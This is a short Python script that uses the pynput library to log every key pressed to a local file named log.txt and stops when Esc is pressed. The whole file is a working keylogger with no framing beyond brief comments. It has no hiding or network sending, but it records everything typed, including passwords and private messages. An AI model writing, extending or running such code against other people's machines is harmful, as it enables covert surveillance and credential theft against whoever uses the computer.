from pynput.keyboard import Listener, Key

# Checking press on keyboard and writing it to the log file
def on_press(key):
    try:
        with open("log.txt", "a") as log:
            log.write(key.char)

    except AttributeError:
        with open("log.txt", "a") as log:
            log.write(str(key))

# For stopping the program press esc 
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Listening the keys on the key board 
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()